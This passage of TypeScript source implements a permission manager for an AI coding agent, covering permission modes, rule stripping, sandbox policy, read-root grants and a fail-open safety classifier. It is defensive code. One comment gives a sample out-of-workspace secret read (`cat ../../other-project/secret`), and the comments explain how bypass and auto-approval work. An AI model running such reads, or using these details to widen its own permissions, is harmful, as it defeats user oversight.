  // into the correct arg tokens and not masked by delimiter-shift.
  const normalized = normalizeCommandForMatching(command);
  const vettedLoopVars = collectSafeLoopVars(normalized);
  for (const sub of splitCompoundCommand(normalized)) {
    const stripped = stripSingleQuotedSpans(sub).trim();
    if (!stripped) continue;
    const tokens = stripped.split(/\s+/);
    for (let i = 1; i < tokens.length; i++) {
      if (argTokenLeaksValue(tokens[i]!, vettedLoopVars)) return true;
    }
  }
  return false;
}

// ---------------------------------------------------------------------------
// PermissionManager
// ---------------------------------------------------------------------------

export class PermissionManager {
  private mode: PermissionMode = 'ask';
  /** Single observer notified by {@link applyMode} on every real mode transition,
   *  regardless of which mutation path (setMode / exitPlanMode / deserialize)
   *  triggered it. Parity: the reference's single `notifyPermissionModeChanged` choke point. */
  private _modeChangeListener?: PermissionModeChangeListener;
  /** Multi-subscriber set notified whenever a DECISION-AFFECTING change lands —
   *  a rule add/remove, a mode transition, or a read-root grant/revoke. Lets a
   *  still-open permission request re-evaluate itself instead of forcing the user
   *  to answer stale UI after an allow rule (or a hook's `updatedPermissions`) was
   *  applied elsewhere while the prompt was on screen. Parity: the reference's
   *  `recheckPermission()` (ToolUseConfirm re-runs the decision on a concurrent
   *  rules change). A Set (not the single {@link _modeChangeListener}) because
   *  several tool-call prompts can be open at once. Empty by default, so a mutation
   *  that happens with no prompt open (e.g. a bulk startup rule load) pays nothing. */
  private _permissionStateChangeListeners: Set<() => void> = new Set();
  private rules: PermissionRule[] = [];
  /**
   * Dangerous code-exec `allow` rules that were REMOVED because they came from an
   * untrusted (shared/committable) settings tier — a project/`command` rule is
   * attacker-PR-able, so a broad interpreter grant it carries (`Bash(python:*)`)
   * must not silently widen auto-approval. Retained for reporting (diagnostics /
   * introspection) via {@link getStrippedDangerousRules}. Parity: the reference's
   * `ToolPermissionContext.strippedDangerousRules`.
   */
  private strippedDangerousRules: PermissionRule[] = [];
  /**
   * Overly-broad bash `allow` rules ({@link isOverlyBroadBashAllowRule}: pattern-less
   * / `*` bash or all-tools allow) that were stripped from an untrusted shared tier
   * at load / settings-sync time. Retained for reporting (diagnostics / introspection)
   * via {@link getStrippedOverlyBroadBashRules}. Parity: the rules dropped by the reference's
   * `removeDangerousPermissions(findOverlyBroadBashPermissions(...))`.
   */
  private strippedOverlyBroadBashRules: PermissionRule[] = [];
  private deniedCommands: Set<string> = new Set();
  private _disableBypass = false;
  /** Human-readable explanation for WHY bypass/auto-allow is currently blocked
   *  (set alongside {@link _disableBypass}). Carried so `/permissions` and the
   *  Shift+Tab "auto mode unavailable" message can tell the operator what to do
   *  — e.g. "blocked by managed policy (disableBypassPermissionsMode)" — rather
   *  than surfacing a bare boolean. Mirrors the reference's reason-differentiated
   *  getAutoModeUnavailableReason (settings vs circuit-breaker vs org-allowlist).
   *  Cleared when bypass is re-enabled. */
  private _disableBypassReason?: string;
  /** Whether bypass-permissions mode was AVAILABLE when this session started
   *  (the reference's ToolPermissionContext.isBypassPermissionsModeAvailable). It is the
   *  POSITIVE counterpart to {@link _disableBypass}: a session launched directly in
   *  `bypassPermissions` has bypass available, and a later switch to `plan` inherits
   *  bypass semantics (see {@link check}). Defaults from the constructor's initial
   *  mode; the CLI can also set it from a launch flag via {@link setBypassModeAvailable}. */
  private _bypassModeAvailable = false;
  /** The permission mode active immediately before plan mode was entered, so a
   *  later plan-mode exit can restore it (the reference's ToolPermissionContext.prePlanMode).
   *  Undefined when not in plan mode or when none was captured. */
  private _prePlanMode?: PermissionMode;
  /** The DESIRED "run the auto-mode safety classifier while in plan mode" setting,
   *  read from the on-disk settings tiers (`useAutoModeDuringPlan`) by
   *  {@link loadTieredRules}. It is the intent; {@link _autoModeActiveDuringPlan} is
   *  the realized state. Toggling it on disk and re-syncing reconciles the realized
   *  state via {@link transitionPlanAutoMode}. Parity: the reference's
   *  getUseAutoModeDuringPlan() settings read (settings/settings.ts). */
  private _useAutoModeDuringPlan = false;
  /** Whether auto-mode screening is ACTIVE right now during the current plan run —
   *  the realized counterpart to {@link _useAutoModeDuringPlan}. When true, a plan-mode
   *  tool call is screened by the auto-mode classifier (screened autonomy) instead of
   *  the pure read-only allowlist, and dangerous code-exec `allow` rules are stripped
   *  into {@link _autoModeStrippedRules} so a broad interpreter grant cannot bypass the
   *  classifier. Reconciled against {@link _useAutoModeDuringPlan} by
   *  {@link transitionPlanAutoMode}; forced off (with rule restore) when plan mode is
   *  left. Parity: the reference's autoModeState.isAutoModeActive() during plan. */
  private _autoModeActiveDuringPlan = false;
  /** Dangerous code-exec `allow` rules stripped specifically to activate
   *  auto-mode-during-plan, held so they can be RESTORED verbatim when auto mode is
   *  deactivated (or plan mode is left). Distinct from {@link strippedDangerousRules}
   *  (load-time untrusted-source stripping, never restored) because an auto-mode strip
   *  is temporary and reversible. Parity: the reference's
   *  ToolPermissionContext.strippedDangerousRules stash restored by
   *  restoreDangerousPermissions(). */
  private _autoModeStrippedRules: PermissionRule[] = [];
  /** Managed-rules-only lockdown (the reference's `allowManagedPermissionRulesOnly`): when
   *  true, ONLY `policySettings`-sourced rules are honored, runtime non-managed grants
   *  are refused, and nothing may be persisted. Set from the managed permissions file
   *  by {@link loadManagedPermissions} / {@link loadTieredRules}. */
  private _managedRulesOnly = false;
  /** Extra absolute paths/dirs the USER has explicitly granted read access to,
   *  OUTSIDE the launch cwd — e.g. via `/add-dir`, `--context-file`, `--image`, or an
   *  approved out-of-workspace read prompt. The launch cwd is always allowed (passed
   *  per-call to the path checks); everything else outside it is confined unless listed
   *  here. This is what makes "point the agent at /some/other/image.png" work while a
   *  silent `cat ../../other-project/secret` stays blocked.
   *
   *  Source-tracked (parity: the reference's `additionalWorkingDirectories` Map keyed by
   *  path with a `{path, source}` value): the value records WHICH tier granted the
   *  root so (a) a grant can be attributed/removed by provenance and (b) only the
   *  PERSISTABLE tiers (not ephemeral `session`/`cliArg`) are written back to
   *  `permissions.additionalDirectories` by {@link saveRules}. An in-session
   *  `/add-dir` grant (`session`) therefore stays in-memory, while a committed
   *  project `additionalDirectories` entry is reloaded on the next launch. */
  private allowedReadRoots: Map<string, PermissionRuleSource> = new Map();

  /** Active bash isolation policy (threaded from the engine's EngineConfig.sandbox).
   *  Consulted ONLY to honor {@link SandboxPolicy.autoAllowBashIfSandboxed}: when the
   *  policy runs every bash command in a container, the container IS the safety
   *  boundary, so the opt-in knob lets `check()` skip the prompt. Undefined → the
   *  feature is inert and bash is gated exactly as before. */
  private sandboxPolicy?: SandboxPolicy;
  /** Resolver injected by the engine that reports whether a bash `command` WILL be
   *  wrapped by the HOST (unshare) auto-sandbox (core's `commandWillBeHostSandboxed`).
   *  Backs the HOST-mode arm of `autoAllowBashIfSandboxed`: when the opt-in knob is on
   *  in a non-container policy, exactly the commands that WILL be sandboxed are
   *  auto-allowed and sandbox-incompatible ones fall through to a regular permission
   *  prompt (parity: the reference's "auto-allow" sandbox mode — try sandboxed, else
   *  regular permissions). Undefined → host-mode auto-allow is inert (container-mode
   *  behavior unchanged). */
  private sandboxEligibilityResolver?: (command: string) => boolean;
  /** Resolver injected by the engine that reports whether a NON-bash tool call is
   *  irreversible for this input (parity: the reference's generic `Tool.isDestructive(input)`).
   *  Lets {@link check} apply the destructive allow-rule downgrade to ANY tool, not
   *  just bash. Absent → only bash destructiveness is considered (unchanged). */
  private toolDestructiveResolver?: (toolName: string, input: Record<string, unknown>) => boolean;

  /** Least-privilege capability ceiling for a forked/background sub-agent (parity:
   *  the reference's `createAutoMemCanUseTool`). When set, {@link check} enforces it BEFORE
   *  and INDEPENDENT of the ambient mode — a non-read-only bash command or a write
   *  outside the confined roots is denied even under auto-allow/bypass. Undefined →
   *  inert (gated exactly as before). Set per sub-engine from EngineConfig. */
  private capabilityCeiling?: ToolCapabilityCeiling;

  /** Optional async safety classifier injected by the engine/common layer, consulted by
   *  {@link check} on the autonomous auto-approve path to DOWNGRADE (never upgrade) a
   *  would-be auto-approval. Undefined → inert (autonomous behavior unchanged). See
   *  {@link AutoModeSafetyClassifier} and {@link setAutoModeSafetyClassifier}. */
  private autoModeSafetyClassifier?: AutoModeSafetyClassifier;
  /** Optional listener notified when the {@link autoModeSafetyClassifier} STARTS
   *  (`checking:true`) and FINISHES (`checking:false`) evaluating a tool call, so the
   *  engine can surface an in-flight "safety check in progress" signal while the async
   *  classifier query runs. Fired ONLY around an actual classifier consult (not on the
   *  fast-path allow). Parity: the reference's `setClassifierChecking`/`clearClassifierChecking`
   *  subscribable signal (`classifierApprovals.ts`). Undefined → no signal emitted. */
  private classifierCheckingListener?: (checking: boolean, toolName: string) => void;
  /** Optional speculative bash-classifier cache injected by the engine/common layer.
   *  Consulted (via {@link primeSpeculativeBashCheck} / {@link resolveSpeculativeBashApproval})
   *  on the INTERACTIVE ask path only: a high-confidence match that resolves inside the
   *  grace window turns a would-be prompt into an allow. Undefined → inert (the prompt
   *  path is unchanged). See {@link SpeculativeClassifierCache}. */
  private speculativeClassifierCache?: SpeculativeClassifierCache;
  /** Transient carry-slot for the reason attached to the MOST RECENT classifier-driven
   *  allow→ask/deny downgrade in {@link check}, consumed (and cleared) by
   *  {@link deriveDecisionReason} so {@link checkWithReason} can attribute the verdict to
   *  the classifier. Scoped to a single check()→deriveDecisionReason() hop (deriveDecisionReason
   *  runs before any re-entrant per-segment check()), so it never leaks across calls. */
  private _pendingClassifierReason?: string;

  /** Unrecognized top-level keys read from `.ami/permissions.json` by {@link loadRules}
   *  (anything other than `mode`/`rules` — e.g. `hooks`, `env`, or a key a future AMI
   *  version adds). {@link saveRules} spreads these back so a round-trip through this
   *  manager does not DESTROY settings it doesn't model. Mirrors the reference's
   *  `...settingsData` preservation spread (permissionsLoader.ts L193-L216/L277-L295). */
  private _extraPersistedKeys: Record<string, unknown> = {};

  // Denial circuit breaker — abort after too many consecutive or total denials
  private consecutiveDenials = 0;
  private totalDenials = 0;
  private readonly MAX_CONSECUTIVE = 3;
  private readonly MAX_TOTAL = 20;

  constructor(mode?: PermissionMode, rules?: PermissionRule[], allowedRoots?: string[]) {
    if (mode) this.applyMode(mode, 'init');
    if (rules) this.rules = [...rules];
    if (allowedRoots) for (const r of allowedRoots) this.registerAllowedRoot(r);
    // A session launched directly in bypassPermissions has bypass available, so a
    // later cycle into plan mode inherits it (parity: isBypassPermissionsModeAvailable).
    if (mode === 'bypassPermissions') this._bypassModeAvailable = true;
  }

  /**
   * Emit a human-readable debug trace of a permission-state mutation. This is the
   * introspection surface for the permission layer — EVERY rule/mode/directory
   * change (add, remove, mode switch, persist) routes one descriptive line through
   * the core logger, so an operator can see exactly what the permission layer
   * changed and why. Routed through {@link logDebug} so it honors the debug-mode
   * gate, credential redaction, and the on-disk/stderr routing the logger already
   * owns (no separate sink). Mirrors the reference's `logForDebugging` calls in
   * applyPermissionUpdate / persistPermissionUpdate (utils/permissions/PermissionUpdate.ts).
   */
  private traceMutation(message: string, data?: Record<string, unknown>): void {
    logDebug('permissions', message, data);
  }

  /**
   * Grant read access to an absolute path (file or directory) that lies OUTSIDE the
   * launch cwd. Sources: `/add-dir`, `--context-file`/`--image` launch flags, and
   * user-approved out-of-workspace read prompts. Stored resolved + normalized so the
   * containment check is a simple prefix match. Idempotent; ignores empty input.
   *
   * `source` records the granting tier (parity: the reference's per-directory `{path,
   * source}`). It defaults to the ephemeral `session` tier so legacy callers
   * (`/add-dir`, `--context-file`, approved prompts) grant an in-memory root that is
   * NOT persisted. Pass a persistable tier (`projectSettings`/`userSettings`/
   * `localSettings`) to make the grant survive across sessions via
   * {@link saveRules} → `permissions.additionalDirectories`. A re-grant with a
   * persistable source UPGRADES an existing session root so it becomes persisted.
   */
  registerAllowedRoot(p: string, source: PermissionRuleSource = 'session'): void {
    if (!p || typeof p !== 'string') return;
    try {
      const abs = path.isAbsolute(p) ? p : path.resolve(p);
      // NFC-canonicalize the key so a root granted in a decomposed (NFD) Unicode
      // spelling byte-matches the NFC-normalized candidate path from
      // resolveForCheck (realpathNFC). Mirrors the reference's state.ts setProjectRoot /
      // setCwdState `.normalize('NFC')` on every stored root path.
      const norm = path.normalize(abs).normalize('NFC');
      const prior = this.allowedReadRoots.get(norm);
      this.allowedReadRoots.set(norm, source);
      // A newly-granted (or re-scoped) root must re-resolve its canonical realpath
      // rather than reuse a stale session-stable memo entry for the same string.
      invalidateSessionStableBaseRealpath(norm);
      // Only trace a real widening of the read boundary (idempotent re-grants of the
      // SAME source are silent), mirroring the reference's "Adding N director(y/ies)" trace.
      // A provenance change (e.g. session → projectSettings) is a meaningful upgrade
      // worth tracing because it flips the dir from in-memory to persisted.
      if (prior === undefined) {
        this.traceMutation(`Adding read directory: ${norm}`);
        // A newly-granted read root can flip an out-of-workspace read prompt to allow —
        // notify any pending recheck. A silent idempotent re-grant does not.
        this.notifyPermissionStateChanged();
      } else if (prior !== source) {
        this.traceMutation(`Re-scoping read directory ${norm}: ${prior} → ${source}`);
        this.notifyPermissionStateChanged();
      }
    } catch { /* non-fatal: a bad path just isn't granted */ }
  }

  /**
   * Revoke a previously-granted read root (inverse of {@link registerAllowedRoot}).
   * Normalizes `p` the same way so a path granted via `/add-dir` can be dropped by
   * `/remove-dir`, letting the workspace boundary SHRINK, not just widen. Returns
   * true if a matching root was removed. The launch cwd is granted per-call and is
   * never in this set, so it can never be revoked here.
   */
  removeAllowedRoot(p: string): boolean {
    if (!p || typeof p !== 'string') return false;
    try {
      const abs = path.isAbsolute(p) ? p : path.resolve(p);
      // Match registerAllowedRoot's NFC canonicalization so a root granted in one
      // Unicode form can be revoked by the other (NFD vs NFC spelling).
      const norm = path.normalize(abs).normalize('NFC');
      const removed = this.allowedReadRoots.delete(norm);
      // Drop the session-stable realpath memo for a revoked root so a later re-grant
      // of the same path (possibly a changed symlink target) resolves fresh.
      if (removed) invalidateSessionStableBaseRealpath(norm);
      // (parity: the reference's removeDirectories set-filter — a removed dir is dropped
      //  from the persisted `additionalDirectories` on the next saveRules too.)
      // Trace only an actual boundary shrink, mirroring the reference's "Removing N
      // director(y/ies)" trace.
      if (removed) {
        this.traceMutation(`Removing read directory: ${norm}`);
        // A revoked read root can flip an open read prompt to deny — notify any recheck.
        this.notifyPermissionStateChanged();
      }
      return removed;
    } catch {
      return false;
    }
  }

  /** The user-granted read roots (absolute, normalized). For inspection/tests. */
  getAllowedReadRoots(): string[] {
    return [...this.allowedReadRoots.keys()];
  }

  /**
   * The user-granted read roots WITH their granting tier (parity: the reference's
   * source-tracked `additionalWorkingDirectories` Map value `{path, source}`). Lets
   * a diagnostic / `/permissions` view attribute each extra directory to its origin
   * (a committed project setting vs an in-session `/add-dir`) and lets a caller
   * selectively remove or re-persist by provenance. Order-stable (insertion order).
   */
  getAllowedReadRootEntries(): { path: string; source: PermissionRuleSource }[] {
    return [...this.allowedReadRoots].map(([p, source]) => ({ path: p, source }));
  }

  /**
   * The subset of granted read roots that are SAFE TO PERSIST to
   * `permissions.additionalDirectories` — everything except the ephemeral
   * `session` and `cliArg` tiers, which are deliberately in-memory only (a
   * per-launch `/add-dir`/`--context-file` grant must not silently leak into a
   * committed settings file). De-duped (a `Map` key is already unique) and
   * order-stable. Mirrors the reference's `persistPermissionUpdate` dedupe-on-add.
   */
  private persistableReadRoots(): string[] {
    const out: string[] = [];
    for (const [p, source] of this.allowedReadRoots) {
      if (source !== 'session' && source !== 'cliArg') out.push(p);
    }
    return out;
  }

  /**
   * The file-READ deny GLOBS configured in the permission layer, so listing/search
   * tools (grep, glob) can EXCLUDE files the user forbade reading — the denied file's
   * matching lines (and even its path) never surface in results, in every output mode.
   * Collected from every `deny` rule targeting the read tool (`file_read`, its the reference
   * alias `Read`, or a tool-wide `*`) that carries a path glob; param-shaped rules
   * (`paramPattern`) and allow/ask rules are skipped. De-duped, order-preserving.
   * Mirrors the reference's `getFileReadIgnorePatterns(toolPermissionContext)`.
   */
  getFileReadIgnorePatterns(): string[] {
    const out: string[] = [];
    const seen = new Set<string>();
    for (const rule of this.rules) {
      if (rule.action !== 'deny' || !rule.pattern || rule.paramPattern) continue;
      if (!this.toolNameMatches(rule.tool, 'file_read')) continue;
      if (seen.has(rule.pattern)) continue;
      seen.add(rule.pattern);
      out.push(rule.pattern);
    }
    return out;
  }

  /**
   * PARITY (the reference's `/add-dir` → `SandboxManager.refreshConfig()` sync — add-dir.tsx
   * L86-94): project the given base sandbox policy with the CURRENT dynamic
   * `allowedReadRoots` folded into `filesystem.allowWrite`, so a directory widened
   * into the workspace at runtime (via `/add-dir`, `--context-file`/`--image`, or an
   * approved out-of-workspace read) is ALSO mounted into the bash container, not just
   * granted in the in-process permission layer.
   *
   * Without this the two guard layers diverge: the permission surface reports the
   * added directory as allowed while the container sandbox still mounts only
   * `projectDir`, so a sandboxed `bash` silently cannot reach a directory the user
   * believes was added (and `/remove-dir` likewise narrows the mount set again, since
   * the projection is recomputed from the live root set each turn).
   *
   * It ALSO folds the active `web_fetch` domain allow/deny rules into
   * `network.allowedHosts`/`deniedHosts`, so the SAME per-domain allowlist that
   * governs the WebFetch tool also governs in-sandbox outbound traffic (parity:
   * the reference's sandbox-adapter, which derives sandbox network domains from WebFetch
   * permission rules). Without this the sandbox network allowlist is never
   * populated from permissions and a sandboxed `curl example.com` is unrestricted
   * even when the user allowed only `web_fetch(github.com)`.
   *
   * Returns `base` unchanged when there is no policy (bash runs on the host, already
   * covered by the permission layer) or when neither extra roots nor web_fetch
   * domain rules are present — the fold only ever ADDS roots/domains. Caller-supplied
   * `filesystem.allowWrite` and `network` entries are preserved and de-duplicated.
   */
  getEffectiveSandboxPolicy(base: SandboxPolicy | undefined): SandboxPolicy | undefined {
    if (!base) return base;
    const roots = [...this.allowedReadRoots.keys()];
    const { allow: fetchAllow, deny: fetchDeny } = this.extractWebFetchSandboxDomains();
    if (roots.length === 0 && fetchAllow.length === 0 && fetchDeny.length === 0) return base;
    let out: SandboxPolicy = base;
    if (roots.length > 0) {
      const existing = base.filesystem?.allowWrite ?? [];
      const merged = [...existing];
      const seen = new Set(existing.map((p) => path.normalize(p)));
      for (const r of roots) {
        const norm = path.normalize(r);
        if (seen.has(norm)) continue;
        seen.add(norm);
        merged.push(r);
      }
      out = { ...out, filesystem: { ...out.filesystem, allowWrite: merged } };
    }
    if (fetchAllow.length > 0 || fetchDeny.length > 0) {
      const net = { ...out.network };
      if (fetchAllow.length > 0) net.allowedHosts = [...new Set([...(net.allowedHosts ?? []), ...fetchAllow])];
      if (fetchDeny.length > 0) net.deniedHosts = [...new Set([...(net.deniedHosts ?? []), ...fetchDeny])];
      out = { ...out, network: net };
    }
    return out;
  }

  /**
   * Collect the domains named by the active `web_fetch` allow/deny rules so they
   * can seed the sandbox outbound network allowlist/denylist. AMI's canonical
   * WebFetch rule content IS the bare domain (`web_fetch(example.com)` /
   * `web_fetch(*.github.com)`; see {@link validatePermissionRule}); a tool-wide
   * rule (no pattern, or `*`) names no specific domain and is skipped. Deny rules
   * feed `deniedHosts` (which wins over `allowedHosts` in the sandbox backend).
   */
  private extractWebFetchSandboxDomains(): { allow: string[]; deny: string[] } {
    const allow: string[] = [];
    const deny: string[] = [];
    for (const rule of this.rules) {
      if (normalizeToolName(rule.tool) !== 'web_fetch') continue;
      const domain = rule.pattern?.trim();
      if (!domain || domain === '*') continue;
      if (rule.action === 'allow') allow.push(domain);
      else if (rule.action === 'deny') deny.push(domain);
    }
    return { allow, deny };
  }

  /**
   * Thread the active bash isolation policy into the permission layer so
   * {@link SandboxPolicy.autoAllowBashIfSandboxed} can be honored in {@link check}.
   * The engine calls this once at construction with its `EngineConfig.sandbox`.
   * Passing `undefined` disables the behavior (bash is gated exactly as before).
   */
  setSandboxPolicy(policy: SandboxPolicy | undefined): void {
    this.sandboxPolicy = policy;
  }

  /**
   * Inject the host-sandbox eligibility resolver (core's `commandWillBeHostSandboxed`,
   * pre-bound by the engine with the active exemption/platform options). Enables the
   * HOST-mode arm of {@link SandboxPolicy.autoAllowBashIfSandboxed}: a command that
   * WILL be host-sandboxed is auto-allowed, while a sandbox-incompatible command falls
   * through to a regular permission prompt. Passing `undefined` makes host-mode
   * auto-allow inert (container-mode behavior is unchanged).
   */
  setSandboxEligibilityResolver(resolver: ((command: string) => boolean) | undefined): void {
    this.sandboxEligibilityResolver = resolver;
  }

  /**
   * Install a least-privilege {@link ToolCapabilityCeiling} for this manager's
   * engine (parity: the reference's forked-agent `canUseTool`). The ceiling is a HARD cap
   * enforced ahead of every mode: it can only deny (never grant), so a forked skill
   * sub-agent can be confined to read-only bash + writes within a directory even when
   * its ambient mode is auto-allow. The engine sets this per sub-engine from
   * `EngineConfig.capabilityCeiling`. Passing `undefined` disables it.
   */
  setCapabilityCeiling(ceiling: ToolCapabilityCeiling | undefined): void {
    this.capabilityCeiling = ceiling;
  }

  /**
   * Register a resolver that reports whether a tool call is DESTRUCTIVE (irreversible:
   * delete / overwrite / send) for the given input, generalizing the bash
   * destructive-command guard to ANY tool (parity: the reference's `Tool.isDestructive(input)`).
   * When it returns true for a call, an over-broad `allow` rule is downgraded to an
   * explicit prompt in `ask` mode — exactly like a destructive bash command — so a
   * wildcard allow can never silently auto-approve an irreversible operation.
   * The engine injects a resolver backed by each tool's `ToolDefinition.isDestructive`.
   * Passing `undefined` disables the generic guard (bash destructiveness still applies).
   */
  setToolDestructiveResolver(
    fn: ((toolName: string, input: Record<string, unknown>) => boolean) | undefined,
  ): void {
    this.toolDestructiveResolver = fn;
  }

  /**
   * Register (or clear, with `undefined`) the autonomous-mode safety classifier
   * ({@link AutoModeSafetyClassifier}). When set, {@link check} consults it on the
   * auto-approve path of the autonomous modes and lets it DOWNGRADE a would-be
   * auto-approval to `ask`/`deny` with a recorded reason. The deterministic engine is
   * the floor — the classifier can only tighten it, never loosen it — and any
   * `undefined`/`allow`/throw FAILS OPEN to the deterministic decision. The engine
   * injects a concrete (e.g. model-backed) classifier here; unset leaves autonomous
   * behavior byte-for-byte unchanged. Parity: the reference's transcript/yolo classifier gate.
   */
  setAutoModeSafetyClassifier(fn: AutoModeSafetyClassifier | undefined): void {
    this.autoModeSafetyClassifier = fn;
  }

  /** Whether an autonomous-mode safety classifier is currently installed. */
  hasAutoModeSafetyClassifier(): boolean {
    return this.autoModeSafetyClassifier !== undefined;
  }

  /**
   * Register (or clear, with `undefined`) a listener fired when the installed
   * {@link setAutoModeSafetyClassifier} STARTS and FINISHES evaluating a tool call.
   * It is invoked with `(true, toolName)` immediately before the async classifier
   * query and `(false, toolName)` once it settles (success, `undefined`, or error) —
   * only when a classifier actually runs for the call. The engine wires this to emit a
   * `classifier_checking` {@link import('./types').EngineEvent} and update the
   * {@link import('./tool-confirmation').ToolConfirmationService} in-flight set. Parity:
   * the reference's `setClassifierChecking`/`clearClassifierChecking` subscribable signal.
   */
  setClassifierCheckingListener(
    fn: ((checking: boolean, toolName: string) => void) | undefined,
  ): void {
    this.classifierCheckingListener = fn;
  }

  /**
   * Register (or clear, with `undefined`) the SPECULATIVE bash-command classifier
   * ({@link SpeculativeBashClassifier}) — the interactive ASK-path grace-race
   * optimization. When set, the engine primes a check for a bash command via
   * {@link primeSpeculativeBashCheck} the moment it needs a decision, then — if the
   * deterministic check resolves to `ask` — calls {@link resolveSpeculativeBashApproval}
   * right before prompting: a HIGH-confidence match that settles inside the grace
   * window auto-approves the command without a prompt. It can only ever turn a
   * would-be prompt into an allow (never deny, never loosen a hardline/deny, which
   * resolve before the ask path). Unset leaves the prompt path byte-for-byte
   * unchanged. Parity: the reference's speculative bash classifier
   * (`bashPermissions.ts` + the race in `useCanUseTool.tsx`). `ttlMs` bounds how
   * long a primed-but-unconsumed check stays live.
   */
  setSpeculativeBashClassifier(
    fn: SpeculativeBashClassifier | undefined,
    options: { ttlMs?: number } = {},
  ): void {
    this.speculativeClassifierCache = fn
      ? new SpeculativeClassifierCache({ classifier: fn, ttlMs: options.ttlMs })
      : undefined;
  }

  /** Whether a speculative bash classifier is currently installed. */
  hasSpeculativeBashClassifier(): boolean {
    return this.speculativeClassifierCache !== undefined;
  }

  /**
   * Prime (start, in the background) a speculative classifier check for a bash
   * `command` so its verdict may be ready by the time a prompt would be shown.
   * No-op when no classifier is installed, and idempotent per command (one in-flight
   * check at a time). Called by the engine as soon as a bash command needs a
   * decision.
   */
  primeSpeculativeBashCheck(command: string): void {
    this.speculativeClassifierCache?.prime(command);
  }

  /**
   * Resolve a primed speculative check for `command`, racing it against `graceMs`.
   * Returns the matched rule description (auto-approve — the engine skips the prompt
   * and allows the command) ONLY when a high-confidence match settles inside the
   * grace window; otherwise `null` (the engine proceeds with the interactive prompt).
   * No-op (`null`) when no classifier is installed or the command was never primed.
   * Called by the engine after {@link check} returns `ask` for a bash command.
   */
  async resolveSpeculativeBashApproval(
    command: string,
    graceMs: number = DEFAULT_SPECULATIVE_GRACE_MS,
  ): Promise<string | null> {
    if (!this.speculativeClassifierCache) return null;
    return this.speculativeClassifierCache.resolveApproval(command, graceMs);
  }

  /**
   * The WHILE-OPEN counterpart of {@link resolveSpeculativeBashApproval}: once the
   * grace race has missed and the interactive prompt is ALREADY on screen, the primed
   * check keeps running; this awaits it to completion and auto-approves the open prompt
   * iff it is a high-confidence match AND the caller's {@link PendingPromptLatch} still
   * permits it (the user has not interacted and nothing else resolved the dialog).
   * Returns the matched description (auto-approve — the UI tears down the dialog and
   * allows the command) or `null` (leave the prompt for the user). No-op (`null`) when
   * no classifier is installed or the command was never primed. The frontend feeds the
   * latch user interactions ({@link PendingPromptLatch.onUserInteraction}) and terminal
   * answers ({@link PendingPromptLatch.claimManualResolve}) so a pressed key can never
   * race-lose to an in-flight auto-approval. Mirrors the reference's background
   * `executeAsyncClassifierCheck` on an open permission dialog (`interactiveHandler.ts`).
   */
  async resolveSpeculativeBashApprovalWhileOpen(
    command: string,
    latch: PendingPromptLatch,
  ): Promise<string | null> {
    if (!this.speculativeClassifierCache) return null;
    return this.speculativeClassifierCache.resolveWhileOpen(command, latch);
  }

  /** Drop every cached speculative check (e.g. on session reset). No-op when no
   *  classifier is installed. */
  clearSpeculativeBashChecks(): void {
    this.speculativeClassifierCache?.clear();
  }

  /**
   * Consult the injected {@link AutoModeSafetyClassifier} for a tool call the
   * deterministic engine is about to auto-approve in an autonomous mode. Returns the
   * (possibly downgraded) verdict. No classifier, an allowlisted-safe tool
   * ({@link isAutoModeSafeTool} — skip the check, mirroring the reference's
   * SAFE_YOLO_ALLOWLISTED_TOOLS fast-path), an `undefined`/`allow` verdict, or a
   * thrown error all FAIL OPEN to `allow`. A downgrade to `ask`/`deny` records the
   * denial (source `'classifier'`) and stashes its reason for
   * {@link deriveDecisionReason}.
   */
  private async applyAutoModeSafetyClassifier(
    toolName: string,
    input: Record<string, unknown>,
  ): Promise<'allow' | 'ask' | 'deny'> {
    const classifier = this.autoModeSafetyClassifier;
    // Fast path: no classifier, or a tool the auto-mode allowlist already deems safe
    // (read-only / coordination) — never spend a classifier call on it.
    if (!classifier || isAutoModeSafeTool(toolName)) return 'allow';
    let verdict: AutoModeSafetyVerdict | undefined;
    // Bracket the async consult with the in-flight CHECKING signal so a frontend can
    // show "safety check in progress" while the classifier query runs. Fired ONLY here
    // (an actual consult), never on the fast-path allow above. The `false` transition
    // runs in `finally` so a thrown/rejected classifier still clears the signal.
    this.classifierCheckingListener?.(true, toolName);
    try {
      verdict = await classifier({ toolName, input, mode: this.mode, staticDecision: 'allow' });
    } catch {
      // Classifier failure must never BLOCK an otherwise-allowed autonomous call:
      // fall back to the deterministic auto-approval (parity: classifier error →
      // static decision). The static engine already screened for hardlines/denies.
      return 'allow';
    } finally {
      this.classifierCheckingListener?.(false, toolName);
    }
    // `allow`, an explicit `passthrough` abstain, or no verdict all FAIL OPEN to
    // the deterministic auto-approval — the classifier declined to tighten it, so
    // no downgrade reason or denial is recorded. `passthrough` is the first-class
    // "no opinion" spelling of returning `undefined` (parity: the reference's passthrough
    // falling through to the normal flow).
    if (!verdict || verdict.decision === 'allow' || verdict.decision === 'passthrough') return 'allow';
    // Downgrade. Carry the reason to deriveDecisionReason so the prompt / denial
    // message can explain WHY the classifier gated this autonomous call.
    this._pendingClassifierReason = verdict.reason ?? '';
    // A `deny` is a genuine block → record it (source 'classifier') so it surfaces in
    // the recent-denials log and feeds the circuit breaker. An `ask` only turns the
    // silent auto-approval into an interactive prompt (not a denial of intent), so it
    // is NOT recorded — matching how a mode-driven `ask` does not trip the breaker.
    if (verdict.decision === 'deny') {
      const display = typeof input.command === 'string' ? input.command : toolName;
      this.recordDenial(display, 'classifier', verdict.reason, 'auto-mode');
    }
    return verdict.decision;
  }

  /**
   * Whether this tool call is destructive: a destructive bash command (keyed off the
   * command classifier) OR any tool the injected {@link setToolDestructiveResolver}
   * resolver flags for this input. Single source of truth for the allow→ask downgrade
   * and its reason attribution, so both stay in lockstep.
   */
  private isDestructiveToolUse(toolName: string, input: Record<string, unknown>): boolean {
    if (toolName === 'bash' && typeof input.command === 'string') {
      return this.classifyBashCommand(input.command) === 'destructive';
    }
    return this.toolDestructiveResolver?.(toolName, input) === true;
  }

  /**
   * Whether a bash command would be auto-approved by the `autoAllowBashIfSandboxed`
   * knob (OPT-IN; OFF unless set to exactly `true`, so the default bash prompt is
   * unchanged). Two arms, both requiring the sandbox to be the safety boundary:
   *   - CONTAINER mode: EVERY command runs in a container (host FS not mounted), so
   *     every command is auto-allowed.
   *   - HOST mode (non-container): auto-allow ONLY the commands that WILL actually be
   *     wrapped by the host (unshare) auto-sandbox — reported by the injected
   *     {@link sandboxEligibilityResolver}. A sandbox-incompatible command returns
   *     false here and falls through to a regular permission prompt (parity: the reference
   *     Code's "auto-allow" sandbox mode — try sandboxed, else regular permissions).
   * the reference's enterprise `sandbox.autoAllowBashIfSandboxed`.
   */
